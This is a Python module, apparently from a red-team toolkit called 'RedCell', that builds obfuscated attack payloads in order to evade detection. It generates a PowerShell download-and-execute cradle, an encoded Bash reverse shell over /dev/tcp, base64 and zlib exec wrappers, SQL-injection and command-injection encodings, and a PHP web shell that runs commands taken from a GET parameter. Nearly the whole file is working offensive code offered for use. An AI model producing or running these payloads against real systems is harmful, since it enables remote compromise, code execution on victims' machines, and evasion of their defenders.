"""
Payload Obfuscation Utilities

Tools for obfuscating payloads to evade basic detection.
"""

import base64
import random
import string
import re
from typing import List, Dict, Optional


class PayloadObfuscator:
    """
    Payload obfuscation utilities for evasion.

    Features:
    - String encoding (base64, hex, ROT13)
    - XOR encryption
    - Variable name randomization
    - PowerShell obfuscation
    - Bash command obfuscation
    - Python code obfuscation
    """

    @staticmethod
    def random_string(length: int = 8) -> str:
        """
        Generate random alphanumeric string.

        Args:
            length: String length

        Returns:
            Random string
        """
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    @staticmethod
    def random_variable_name(prefix: str = "var") -> str:
        """
        Generate random variable name.

        Args:
            prefix: Variable prefix

        Returns:
            Random variable name
        """
        return f"{prefix}_{PayloadObfuscator.random_string(6)}"

    # String Encoding Methods

    @staticmethod
    def base64_encode(data: str) -> str:
        """
        Base64 encode string.

        Args:
            data: String to encode

        Returns:
            Base64 encoded string
        """
        return base64.b64encode(data.encode()).decode()

    @staticmethod
    def base64_decode(data: str) -> str:
        """
        Base64 decode string.

        Args:
            data: Base64 string to decode

        Returns:
            Decoded string
        """
        return base64.b64decode(data.encode()).decode()

    @staticmethod
    def hex_encode(data: str) -> str:
        """
        Hex encode string.

        Args:
            data: String to encode

        Returns:
            Hex encoded string
        """
        return data.encode().hex()

    @staticmethod
    def hex_decode(data: str) -> str:
        """
        Hex decode string.

        Args:
            data: Hex string to decode

        Returns:
            Decoded string
        """
        return bytes.fromhex(data).decode()

    @staticmethod
    def rot13(data: str) -> str:
        """
        ROT13 encode/decode string.

        Args:
            data: String to encode/decode

        Returns:
            ROT13 encoded/decoded string
        """
        result = []
        for char in data:
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)

    @staticmethod
    def xor_encrypt(data: str, key: str) -> bytes:
        """
        XOR encrypt string.

        Args:
            data: String to encrypt
            key: Encryption key

        Returns:
            Encrypted bytes
        """
        key_bytes = key.encode()
        data_bytes = data.encode()
        return bytes([data_bytes[i] ^ key_bytes[i % len(key_bytes)]
                     for i in range(len(data_bytes))])

    @staticmethod
    def xor_decrypt(data: bytes, key: str) -> str:
        """
        XOR decrypt bytes.

        Args:
            data: Encrypted bytes
            key: Decryption key

        Returns:
            Decrypted string
        """
        key_bytes = key.encode()
        return bytes([data[i] ^ key_bytes[i % len(key_bytes)]
                     for i in range(len(data))]).decode()

    # PowerShell Obfuscation

    @staticmethod
    def obfuscate_powershell(command: str, level: int = 1) -> str:
        """
        Obfuscate PowerShell command.

        Args:
            command: PowerShell command
            level: Obfuscation level (1-3)

        Returns:
            Obfuscated PowerShell command
        """
        if level == 1:
            # Basic: Base64 encoding
            encoded = base64.b64encode(command.encode('utf-16le')).decode()
            return f"powershell -EncodedCommand {encoded}"

        elif level == 2:
            # Medium: String concatenation and variable substitution
            # Replace common keywords with concatenated strings
            obfuscated = command
            replacements = {
                'Invoke-Expression': "'In'+'voke-Ex'+'pression'",
                'New-Object': "'New-Ob'+'ject'",
                'DownloadString': "'Down'+'loadStr'+'ing'",
                'System.Net.WebClient': "'System.Net.Web'+'Client'",
            }

            for original, replacement in replacements.items():
                obfuscated = obfuscated.replace(original, f"$({replacement})")

            return obfuscated

        elif level == 3:
            # Advanced: Multiple techniques combined
            # Variable randomization + string concatenation + encoding
            var_name = PayloadObfuscator.random_variable_name("ps")
            encoded = base64.b64encode(command.encode('utf-16le')).decode()

            wrapper = f"""
${var_name} = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{encoded}'))
Invoke-Expression ${var_name}
"""
            return wrapper.strip()

        return command

    @staticmethod
    def obfuscate_powershell_download_execute(url: str, level: int = 2) -> str:
        """
        Create obfuscated PowerShell download-and-execute payload.

        Args:
            url: URL to download from
            level: Obfuscation level

        Returns:
            Obfuscated PowerShell command
        """
        if level == 1:
            cmd = f"(New-Object Net.WebClient).DownloadString('{url}') | IEX"
        elif level == 2:
            cmd = f"$w=(New-Object Net.WebClient);$d=$w.DownloadString('{url}');IEX $d"
        else:
            var1 = PayloadObfuscator.random_variable_name("wc")
            var2 = PayloadObfuscator.random_variable_name("data")
            cmd = f"${var1}=New-Object Net.WebClient;${var2}=${var1}.DownloadString('{url}');Invoke-Expression ${var2}"

        return PayloadObfuscator.obfuscate_powershell(cmd, level)

    # Bash Obfuscation

    @staticmethod
    def obfuscate_bash(command: str, level: int = 1) -> str:
        """
        Obfuscate Bash command.

        Args:
            command: Bash command
            level: Obfuscation level (1-3)

        Returns:
            Obfuscated command
        """
        if level == 1:
            # Basic: Base64 encoding
            encoded = base64.b64encode(command.encode()).decode()
            return f"echo {encoded} | base64 -d | bash"

        elif level == 2:
            # Medium: Hex encoding
            hex_cmd = command.encode().hex()
            return f"echo {hex_cmd} | xxd -r -p | bash"

        elif level == 3:
            # Advanced: Character substitution and variable expansion
            # Convert to array of ASCII values
            ascii_vals = [str(ord(c)) for c in command]
            array_str = ' '.join(ascii_vals)
            return f"eval $(printf '%b' $(printf '\\\\x%x ' {array_str}))"

        return command

    @staticmethod
    def obfuscate_bash_reverse_shell(lhost: str, lport: int, level: int = 2) -> str:
        """
        Create obfuscated Bash reverse shell.

        Args:
            lhost: Listener host
            lport: Listener port
            level: Obfuscation level

        Returns:
            Obfuscated reverse shell command
        """
        shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

        if level == 1:
            return shell_cmd
        elif level == 2:
            encoded = base64.b64encode(shell_cmd.encode()).decode()
            return f"echo {encoded}|base64 -d|bash"
        else:
            return PayloadObfuscator.obfuscate_bash(shell_cmd, level=3)

    # Python Obfuscation

    @staticmethod
    def obfuscate_python(code: str, level: int = 1) -> str:
        """
        Obfuscate Python code.

        Args:
            code: Python code
            level: Obfuscation level (1-3)

        Returns:
            Obfuscated Python code
        """
        if level == 1:
            # Basic: Base64 + exec
            encoded = base64.b64encode(code.encode()).decode()
            return f"import base64;exec(base64.b64decode('{encoded}'))"

        elif level == 2:
            # Medium: Variable name randomization
            obfuscated = code

            # Find variable names (simple regex - not perfect)
            variables = re.findall(r'\b([a-z_][a-z0-9_]*)\b', code)
            unique_vars = list(set(variables) - {'import', 'from', 'def', 'class',
                                                  'if', 'else', 'for', 'while', 'return',
                                                  'print', 'exec', 'eval'})

            # Replace with random names
            var_map = {var: PayloadObfuscator.random_variable_name()
                      for var in unique_vars[:10]}  # Limit to prevent over-obfuscation

            for original, replacement in var_map.items():
                obfuscated = re.sub(r'\b' + original + r'\b', replacement, obfuscated)

            return obfuscated

        elif level == 3:
            # Advanced: Compression + base64 + exec
            import zlib
            compressed = zlib.compress(code.encode())
            encoded = base64.b64encode(compressed).decode()
            return f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{encoded}')))"

        return code

    @staticmethod
    def randomize_variable_names(code: str, preserve: Optional[List[str]] = None) -> str:
        """
        Randomize variable names in code.

        Args:
            code: Source code
            preserve: List of variable names to preserve

        Returns:
            Code with randomized variable names
        """
        preserve = preserve or []
        preserve.extend(['import', 'from', 'def', 'class', 'if', 'else',
                        'for', 'while', 'return', 'print', 'exec', 'eval',
                        'self', 'True', 'False', 'None'])

        # Find all variables
        variables = re.findall(r'\b([a-z_][a-z0-9_]*)\b', code)
        unique_vars = [v for v in set(variables) if v not in preserve]

        # Create mapping
        var_map = {var: PayloadObfuscator.random_variable_name()
                  for var in unique_vars}

        # Replace
        result = code
        for original, replacement in var_map.items():
            result = re.sub(r'\b' + original + r'\b', replacement, result)

        return result

    # SQL Payload Obfuscation

    @staticmethod
    def obfuscate_sql_payload(payload: str) -> str:
        """
        Obfuscate SQL injection payload.

        Args:
            payload: SQL payload

        Returns:
            Obfuscated payload
        """
        # Use comments to break up keywords
        obfuscated = payload
        obfuscated = obfuscated.replace('SELECT', 'SEL/**/ECT')
        obfuscated = obfuscated.replace('UNION', 'UNI/**/ON')
        obfuscated = obfuscated.replace('WHERE', 'WH/**/ERE')
        obfuscated = obfuscated.replace('FROM', 'FR/**/OM')

        # Add random whitespace
        obfuscated = re.sub(r'\s+', lambda m: ' ' * random.randint(1, 3), obfuscated)

        return obfuscated

    # Command Injection Payload Obfuscation

    @staticmethod
    def obfuscate_command_injection(command: str, shell_type: str = 'bash') -> str:
        """
        Obfuscate command injection payload.

        Args:
            command: Command to obfuscate
            shell_type: Shell type (bash, powershell)

        Returns:
            Obfuscated command
        """
        if shell_type == 'bash':
            # Use variable expansion and encoding
            encoded = ''.join([f'\\x{ord(c):02x}' for c in command])
            return f"${{IFS}}$(printf{encoded})"

        elif shell_type == 'powershell':
            # Use string concatenation
            parts = [f"'{c}'" for c in command]
            return '+'.join(parts)

        return command

    # Web Shell Obfuscation

    @staticmethod
    def obfuscate_php_webshell(shell_code: str) -> str:
        """
        Obfuscate PHP web shell.

        Args:
            shell_code: PHP shell code

        Returns:
            Obfuscated PHP code
        """
        # Base64 + eval
        encoded = base64.b64encode(shell_code.encode()).decode()
        return f"<?php eval(base64_decode('{encoded}')); ?>"

    @staticmethod
    def create_obfuscated_php_shell(command_param: str = 'cmd') -> str:
        """
        Create obfuscated PHP web shell.

        Args:
            command_param: Command parameter name

        Returns:
            Obfuscated PHP shell code
        """
        # Create multi-layer obfuscated shell
        var1 = PayloadObfuscator.random_variable_name("a")
        var2 = PayloadObfuscator.random_variable_name("b")

        shell = f"""<?php
${var1} = str_rot13('flfgrz');  // system
${var2} = $_GET['{command_param}'];
${var1}(${var2});
?>"""
        return shell


def main():
    """Main function for standalone testing."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell Payload Obfuscator')
    parser.add_argument('--type', choices=['powershell', 'bash', 'python', 'sql', 'php'],
                       required=True, help='Payload type')
    parser.add_argument('--payload', required=True, help='Payload to obfuscate')
    parser.add_argument('--level', type=int, default=2, help='Obfuscation level (1-3)')

    args = parser.parse_args()

    obfuscator = PayloadObfuscator()

    if args.type == 'powershell':
        result = obfuscator.obfuscate_powershell(args.payload, args.level)
    elif args.type == 'bash':
        result = obfuscator.obfuscate_bash(args.payload, args.level)
    elif args.type == 'python':
        result = obfuscator.obfuscate_python(args.payload, args.level)
    elif args.type == 'sql':
        result = obfuscator.obfuscate_sql_payload(args.payload)
    elif args.type == 'php':
        result = obfuscator.obfuscate_php_webshell(args.payload)
    else:
        result = args.payload

    print("[+] Obfuscated payload:")
    print(result)


if __name__ == '__main__':
    main()
